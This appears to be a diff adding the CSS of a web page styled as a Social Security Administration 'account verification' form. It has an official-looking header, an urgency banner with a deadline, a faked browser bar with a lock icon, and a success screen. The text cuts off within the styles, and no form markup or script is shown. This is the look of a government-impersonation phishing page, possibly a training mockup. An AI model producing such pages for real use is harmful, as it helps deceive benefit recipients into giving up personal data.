@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SSA Account Verification - Protect Your Benefits</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root {
+            --ssa-navy: #0c2d5c;
+            --ssa-navy-light: #143d78;
+            --ssa-blue: #1a5276;
+            --ssa-accent: #b31b34;
+            --ssa-gold: #c4941c;
+            --ssa-gray: #f5f6f8;
+            --ssa-border: #d5d8dc;
+            --ssa-text: #1c1c1c;
+            --ssa-subtle: #5a5a5a;
+            --alert-bg: #fff8e6;
+            --alert-border: #e6a817;
+            --alert-text: #7c5e10;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Source Sans Pro', 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: #e8ebf0;
+            min-height: 100vh;
+            padding: 0;
+            color: var(--ssa-text);
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .browser-chrome {
+            background: #e0e3e8;
+            padding: 10px 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid #c8ccd4;
+            user-select: none;
+        }
+        .browser-dots {
+            display: flex;
+            gap: 7px;
+            flex-shrink: 0;
+        }
+        .browser-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+            flex-shrink: 0;
+        }
+        .browser-dot.red {
+            background: #ee5a55;
+            border: 1px solid #d9443f;
+        }
+        .browser-dot.yellow {
+            background: #f5be3c;
+            border: 1px solid #daa520;
+        }
+        .browser-dot.green {
+            background: #5eca5e;
+            border: 1px solid #45a845;
+        }
+        .browser-url-bar {
+            background: #fafbfc;
+            padding: 7px 14px;
+            border-radius: 6px;
+            border: 1px solid #c5c9cf;
+            flex: 1;
+            font-family: 'SF Mono', 'Menlo', 'Consolas', 'Courier New', monospace;
+            font-size: 12px;
+            color: #3a7d3a;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            min-width: 0;
+        }
+        .browser-url-bar .lock-icon {
+            flex-shrink: 0;
+            font-size: 13px;
+        }
+        .browser-url-bar .domain-name {
+            font-weight: 700;
+            color: #2a6e2a;
+        }
+        .browser-url-bar .path-segment {
+            color: #5a8a5a;
+        }
+
+        .page-wrapper {
+            max-width: 760px;
+            margin: 0 auto;
+            background: #ffffff;
+            min-height: 100vh;
+            box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.05), 0 8px 40px rgba(0, 0, 0, 0.12);
+        }
+
+        .gov-header {
+            background: var(--ssa-navy);
+            color: #ffffff;
+            padding: 0;
+            position: relative;
+        }
+        .gov-header-top {
+            background: #091f3d;
+            padding: 6px 24px;
+            font-size: 11px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 20px;
+            color: #bcc5d0;
+            letter-spacing: 0.2px;
+        }
+        .gov-header-top span {
+            cursor: default;
+        }
+        .gov-header-top span:hover {
+            color: #ffffff;
+        }
+        .gov-header-main {
+            padding: 22px 28px 20px;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+        .ssa-emblem {
+            width: 62px;
+            height: 62px;
+            border-radius: 50%;
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            position: relative;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.18);
+        }
+        .ssa-emblem-inner {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 3px solid var(--ssa-navy);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 17px;
+            color: var(--ssa-navy);
+            letter-spacing: 1px;
+            font-family: 'Georgia', 'Times New Roman', serif;
+        }
+        .header-titles h1 {
+            font-size: 22px;
+            font-weight: 700;
+            margin: 0 0 2px;
+            letter-spacing: 0.3px;
+            color: #ffffff;
+        }
+        .header-titles .subtitle {
+            font-size: 13px;
+            font-weight: 400;
+            color: #c8d6e5;
+            letter-spacing: 0.2px;
+        }
+        .header-titles .official-tag {
+            display: inline-block;
+            background: #ffffff;
+            color: var(--ssa-navy);
+            font-size: 10px;
+            font-weight: 700;
+            padding: 3px 10px;
+            border-radius: 3px;
+            margin-top: 6px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .urgency-bar {
+            background: var(--alert-bg);
+            border-left: 5px solid var(--ssa-accent);
+            border-bottom: 1px solid #e8d5a0;
+            padding: 16px 28px;
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+        }
+        .urgency-icon {
+            font-size: 28px;
+            flex-shrink: 0;
+            line-height: 1;
+            margin-top: 2px;
+        }
+        .urgency-content h3 {
+            font-size: 15px;
+            font-weight: 700;
+            color: #8b1a1a;
+            margin: 0 0 4px;
+            letter-spacing: 0.2px;
+        }
+        .urgency-content p {
+            font-size: 13px;
+            color: #6b4e0e;
+            margin: 0;
+            line-height: 1.5;
+        }
+        .urgency-content .deadline {
+            font-weight: 700;
+            color: #b31b34;
+            background: #fff0f0;
+            padding: 2px 8px;
+            border-radius: 3px;
+            white-space: nowrap;
+        }
+
+        .form-container {
+            padding: 28px 32px 32px;
+        }
+        .form-intro {
+            font-size: 14px;
+            color: #444;
+            margin-bottom: 24px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #e8eaed;
+            line-height: 1.6;
+        }
+        .section-header {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--ssa-navy);
+            margin: 24px 0 16px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid var(--ssa-navy);
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+            font-size: 13px;
+        }
+        .section-header:first-of-type {
+            margin-top: 0;
+        }
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 18px;
+        }
+        .form-row.three-col {
+            grid-template-columns: 1fr 1fr 1fr;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group.full-width {
+            grid-column: 1 / -1;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 5px;
+            letter-spacing: 0.1px;
+        }
+        .form-group label .required-star {
+            color: var(--ssa-accent);
+            font-weight: 700;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 11px 14px;
+            border: 1.5px solid #c9cdd4;
+            border-radius: 5px;
+            font-size: 14px;
+            font-family: inherit;
+            color: #1c1c1c;
+            background: #fdfefe;
+            transition: all 0.18s ease;
+            letter-spacing: 0.2px;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--ssa-navy);
+            box-shadow: 0 0 0 3px rgba(12, 45, 92, 0.08);
+            background: #ffffff;
+        }
+        .form-group input::placeholder {
+            color: #a0a6b0;
+            font-style: italic;
+            font-size: 13px;
+        }
+        .form-group .input-hint {
+            font-size: 11px;
+            color: #888;
+            margin-top: 3px;
+            letter-spacing: 0.1px;
+        }
+        .form-divider {
+            border: none;
+            border-top: 1px solid #e0e3e8;
+            margin: 6px 0 20px;
+        }
+        .warning-note {
+            background: #fffdf7;
+            border: 1px solid #e8dca0;
+            border-radius: 6px;
+            padding: 14px 18px;
+            font-size: 12px;
+            color: #6b5a1a;
+            margin: 18px 0;
+            line-height: 1.5;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        .warning-note .note-icon {
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        .submit-section {
+            margin-top: 28px;
+            padding-top: 20px;
+            border-top: 1px solid #e0e3e8;
+        }
+        .certification-text {
+            font-size: 12px;
+            color: #555;
+            margin-bottom: 16px;
+            line-height: 1.5;
+            text-align: center;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 15px 24px;
+            background: linear-gradient(180deg, #1a5276 0%, #0c2d5c 100%);
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.4px;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 6px rgba(12, 45, 92, 0.25);
+            text-transform: uppercase;
+        }
+        .submit-btn:hover {
+            background: linear-gradient(180deg, #1d5f8a 0%, #0f3768 100%);
+            box-shadow: 0 4px 12px rgba(12, 45, 92, 0.35);
+            transform: translateY(-1px);
+        }
+        .submit-btn:active {
+            transform: translateY(0);
+            box-shadow: 0 1px 3px rgba(12, 45, 92, 0.3);
+        }
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 11px;
+            color: #777;
+            margin-top: 12px;
+            letter-spacing: 0.2px;
+        }
+        .secure-badge .lock-symbol {
+            font-size: 12px;
+        }
+
+        .gov-footer {
+            background: #f4f5f7;
+            border-top: 1px solid #dde0e4;
+            padding: 20px 28px;
+            font-size: 11px;
+            color: #777;
+            text-align: center;
+            line-height: 1.8;
+        }
+        .gov-footer .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 10px;
+        }
+        .gov-footer .footer-links a {
+            color: #3a5a80;
+            text-decoration: none;
+            font-weight: 500;
+            letter-spacing: 0.1px;
+        }
+        .gov-footer .footer-links a:hover {
+            text-decoration: underline;
+            color: var(--ssa-navy);
+        }
+        .gov-footer .omb-info {
+            font-size: 10px;
+            color: #999;
+            margin-top: 6px;
+        }
+
+        .success-section {
+            display: none;
+            text-align: center;
+            padding: 60px 40px;
+        }
+        .success-section .success-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: successPulse 0.6s ease-out;
+        }
+        @keyframes successPulse {
+            0% {
+                transform: scale(0.3);
+                opacity: 0;
+            }
+            60% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        .success-section h2 {
+            color: #1a7a2e;
+            font-size: 24px;
+            margin-bottom: 10px;
+            letter-spacing: 0.3px;
+        }
+        .success-section .confirmation-number {
+            background: #f0f7f0;
+            display: inline-block;
+            padding: 10px 22px;
+            border-radius: 6px;
+            font-family: 'SF Mono', 'Menlo', 'Consolas', monospace;
+            font-size: 15px;
+            font-weight: 700;
+            color: #1a5c2a;
+            letter-spacing: 1px;
+            margin: 12px 0 18px;
+            border: 1px solid #c8e0c8;
+        }
+        .success-section p {
+            color: #555;
+            font-size: 14px;
+            line-height: 1.7;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+        .success-section .benefits-secure {
+            display: inline-block;
+            background: #e8f5e8;
+            color: #1a5c2a;
+            padding: 8px 18px;
+            border-radius: 20
